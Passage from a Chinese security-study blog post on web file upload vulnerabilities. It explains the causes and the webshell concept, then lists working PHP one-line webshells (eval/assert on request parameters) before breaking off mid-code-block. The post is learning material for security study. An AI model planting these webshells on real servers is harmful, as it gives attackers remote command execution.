<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="1asy"><meta name="copyright" content="1asy"><meta name="generator" content="Hexo 5.2.0"><meta name="theme" content="hexo-theme-yun"><title>web漏洞学习-文件上传 | 1asy</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.22/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_ed8vp4atwoj.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.20.0/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="shortcut icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"self-ferry.github.io","root":"/","title":"1asy的小站","version":"1.3.0","mode":"dark","copycode":true,"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><meta name="description" content="前言回家了也要学习呀。  zksmile 最近讲了文件上传漏洞，无事，想总结一下方便以后复习。大部分内容转载自https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_43390703&#x2F;article&#x2F;details&#x2F;104858705 没办法写的太好了。不重复造轮子了  持续更新！ 介绍文件上传漏洞 文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限">
<meta property="og:type" content="article">
<meta property="og:title" content="web漏洞学习-文件上传">
<meta property="og:url" content="https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
<meta property="og:site_name" content="1asy">
<meta property="og:description" content="前言回家了也要学习呀。  zksmile 最近讲了文件上传漏洞，无事，想总结一下方便以后复习。大部分内容转载自https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_43390703&#x2F;article&#x2F;details&#x2F;104858705 没办法写的太好了。不重复造轮子了  持续更新！ 介绍文件上传漏洞 文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image006.png">
<meta property="og:image" content="https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image001.png">
<meta property="og:image" content="https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image002.png">
<meta property="og:image" content="https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image003.png">
<meta property="og:image" content="https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image004.png">
<meta property="og:image" content="https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image005.png">
<meta property="article:published_time" content="2021-01-12T14:14:02.000Z">
<meta property="article:modified_time" content="2021-01-16T10:34:47.850Z">
<meta property="article:author" content="1asy">
<meta property="article:tag" content="文件上传">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image006.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><canvas id="trianglifyContainer"></canvas><script defer src="https://cdn.jsdelivr.net/npm/trianglify@4/dist/trianglify.bundle.js"></script><script>document.addEventListener("DOMContentLoaded", () => {
  const pattern = trianglify({
    width: 800,
    height: 600,
    cellSize: 75,
    palette: ["YlGnBu", "GnBu", "Purples", "Blues"],
  });
  const canvasOpts = {
    applyCssScaling: false
  }
  document.body.appendChild(pattern.toCanvas(trianglifyContainer, canvasOpts));
});</script><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="1asy"><img width="96" loading="lazy" src="/cool.jpg" alt="1asy"></a><div class="site-author-name"><a href="/about/">1asy</a></div><a class="site-name" href="/about/site.html">1asy</a><sub class="site-subtitle">悟已往之不谏 知来者之可追 实迷途其未远 觉今是而昨非</sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">32</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">12</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">37</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-rss-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=epvxdq1sknJe9JMj6J1LsBw4a6cI_2ln&amp;jump_from=webapi" title="QQ 群 389401003" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Self-ferry" title="GitHub" target="_blank" style="color:#6e5494"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/jizhideyunyoujun" title="微博" target="_blank" style="color:#E6162D"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-weibo-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.douban.com/people/yunyoujun/" title="豆瓣" target="_blank" style="color:#007722"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-douban-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=247102977" title="网易云音乐" target="_blank" style="color:#C20C0C"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-netease-cloud-music-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/yunyoujun/" title="知乎" target="_blank" style="color:#0084FF"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-zhihu-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/YunYouJun" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://t.me/elpsycn" title="Telegram Channel" target="_blank" style="color:#0088CC"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-telegram-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:Self_ferry@163.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.now.sh/" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-send-plane-2-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">介绍文件上传漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%89%E5%85%B3%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">有关文件上传的知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">3.1.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.2.</span> <span class="toc-text">一句话木马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">文件上传的攻击与防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%89%8D%E7%AB%AF%E9%99%90%E5%88%B6"><span class="toc-number">4.1.</span> <span class="toc-text">本地前端限制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.2.</span> <span class="toc-text">绕过方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.3.</span> <span class="toc-text">操作方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8B%E6%89%A9%E5%B1%95%E5%90%8D"><span class="toc-number">4.2.</span> <span class="toc-text">服务器检测扩展名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5"><span class="toc-number">4.2.1.</span> <span class="toc-text">黑名单策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%AD%96%E7%95%A5"><span class="toc-number">4.2.2.</span> <span class="toc-text">白名单策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.2.3.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="toc-number">4.2.4.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8BMIME"><span class="toc-number">4.3.</span> <span class="toc-text">服务器检测MIME</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.3.1.</span> <span class="toc-text">常见类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-2"><span class="toc-number">4.3.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6"><span class="toc-number">4.4.</span> <span class="toc-text">文件头检查文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%A0%BC%E5%BC%8F"><span class="toc-number">4.4.1.</span> <span class="toc-text">常见格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-3"><span class="toc-number">4.4.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6Web-Server%E5%AF%B9%E7%89%B9%E5%AE%9A%E7%B1%BB%E5%9E%8B%E6%96%87%E4%BB%B6%E7%9A%84%E8%A1%8C%E4%B8%BA-htaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">4.5.</span> <span class="toc-text">限制Web Server对特定类型文件的行为(.htaccess文件攻击)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">4.5.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-4"><span class="toc-number">4.5.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F00%E6%88%AA%E6%96%AD"><span class="toc-number">4.6.</span> <span class="toc-text">文件系统00截断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-3"><span class="toc-number">4.6.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-5"><span class="toc-number">4.6.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-windows-NTFS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87"><span class="toc-number">4.7.</span> <span class="toc-text">7.windows NTFS文件系统特性绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-6"><span class="toc-number">4.7.1.</span> <span class="toc-text">绕过方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="toc-number">4.8.</span> <span class="toc-text">二次渲染绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">4.9.</span> <span class="toc-text">条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E4%B8%80%EF%BC%9A%E9%87%91%E9%A2%9D%E6%8F%90%E7%8E%B0"><span class="toc-number">4.9.1.</span> <span class="toc-text">例一：金额提现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E4%BA%8C%EF%BC%9Amoctf%E9%87%8C%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98"><span class="toc-number">4.9.2.</span> <span class="toc-text">例二：moctf里的一道题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E4%B8%89%EF%BC%9AXMAN-Easy-Gallery"><span class="toc-number">4.9.3.</span> <span class="toc-text">例三：XMAN-Easy Gallery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E6%96%B9%E5%BC%8F%E2%80%94%E7%BB%95%E8%BF%87"><span class="toc-number">4.10.</span> <span class="toc-text">其它方式—绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-4"><span class="toc-number">4.10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-7"><span class="toc-number">4.10.2.</span> <span class="toc-text">绕过方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81web-server%E7%BB%84%E5%90%88"><span class="toc-number">5.</span> <span class="toc-text">常见web server组合</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%A3%80%E6%B5%8B%E6%B5%81%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text">文件上传检测流程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%91%E5%9B%BE-%E3%80%90by-zksmile%E3%80%91"><span class="toc-number">6.1.</span> <span class="toc-text">脑图 【by zksmile】</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">6.2.</span> <span class="toc-text">流程</span></a></li></ol></li></ol></div></div></div><div class="tag-cloud"><div class="tag-cloud-tags"><a href="/tags/ANSI/" style="font-size: 12px; color: #999">ANSI</a> <a href="/tags/ASCII/" style="font-size: 12px; color: #999">ASCII</a> <a href="/tags/Apeache/" style="font-size: 12px; color: #999">Apeache</a> <a href="/tags/GBK/" style="font-size: 12px; color: #999">GBK</a> <a href="/tags/HTML/" style="font-size: 12px; color: #999">HTML</a> <a href="/tags/Hadoop/" style="font-size: 12px; color: #999">Hadoop</a> <a href="/tags/Linux%E5%91%BD%E4%BB%A4/" style="font-size: 12px; color: #999">Linux命令</a> <a href="/tags/SQLmap/" style="font-size: 12px; color: #999">SQLmap</a> <a href="/tags/SSH%E9%9A%A7%E9%81%93/" style="font-size: 12px; color: #999">SSH隧道</a> <a href="/tags/URL-%E7%BC%96%E7%A0%81-%E8%A7%A3%E7%A0%81/" style="font-size: 12px; color: #999">URL 编码/解码</a> <a href="/tags/UTF-8/" style="font-size: 12px; color: #999">UTF-8</a> <a href="/tags/Unicode/" style="font-size: 12px; color: #999">Unicode</a> <a href="/tags/WindowsPE%E7%BB%93%E6%9E%84/" style="font-size: 12px; color: #999">WindowsPE结构</a> <a href="/tags/guestbook/" style="font-size: 12px; color: #999">guestbook</a> <a href="/tags/http/" style="font-size: 12px; color: #999">http</a> <a href="/tags/markdown-%E5%AD%A6%E4%B9%A0/" style="font-size: 12px; color: #999">markdown 学习</a> <a href="/tags/multiprocessing/" style="font-size: 12px; color: #999">multiprocessing</a> <a href="/tags/my-first-blog/" style="font-size: 12px; color: #999">my first blog</a> <a href="/tags/mysql%E4%B8%BB%E9%94%AE/" style="font-size: 12px; color: #999">mysql主键</a> <a href="/tags/payload/" style="font-size: 12px; color: #999">payload</a></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://Self-ferry.github.io/2021/01/12/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="1asy"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="1asy"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">web漏洞学习-文件上传</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2021-01-12 22:14:02" itemprop="dateCreated datePublished" datetime="2021-01-12T22:14:02+08:00">2021-01-12</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-2-line"></use></svg></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2021-01-16 18:34:47" itemprop="dateModified" datetime="2021-01-16T18:34:47+08:00">2021-01-16</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="本文字数">8.7k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="阅读时长">35m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category" href="/categories/web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">web安全</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">文件上传</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#0078E7;"><font color="#FFEBCD">

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>回家了也要学习呀。</p>
<blockquote>
<p>zksmile 最近讲了文件上传漏洞，无事，想总结一下方便以后复习。大部分内容转载自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43390703/article/details/104858705">https://blog.csdn.net/qq_43390703/article/details/104858705</a> 没办法写的太好了。不重复造轮子了</p>
</blockquote>
<p>持续更新！</p>
<h1 id="介绍文件上传漏洞"><a href="#介绍文件上传漏洞" class="headerlink" title="介绍文件上传漏洞"></a>介绍文件上传漏洞</h1><blockquote>
<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
</blockquote>
<p>产生原因：</p>
<ul>
<li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li>
<li>对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查</li>
<li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）</li>
<li>对于web server对于上传文件或者指定目录的行为没有做限制</li>
</ul>
<p>原理：</p>
<blockquote>
<p>在 WEB 中进行文件上传的原理是通过将表单设为 multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>
</blockquote>
<p>文件上传后导致的常见安全问题一般有:</p>
<p>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代<br>码执行;</p>
<p>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其<br>他通过类似方式控制策略文件的情况类似);</p>
<p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p>
<p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>行，被用于钓鱼和欺诈。</p>
<p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)”执行此脚本;等等。</p>
<h1 id="有关文件上传的知识"><a href="#有关文件上传的知识" class="headerlink" title="有关文件上传的知识"></a>有关文件上传的知识</h1><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p>什么是webshell<br>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。 WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录</p>
<h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><p>常用的webshell就是一句话木马，结合中国菜刀或者hackbar等工具可以很高效快捷的获得网站shell。</p>
<pre class="language-php" data-language="php"><code class="language-php">##PHP：
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r00ts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); </span><span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token comment">//?cmd=phpinfo();</span>
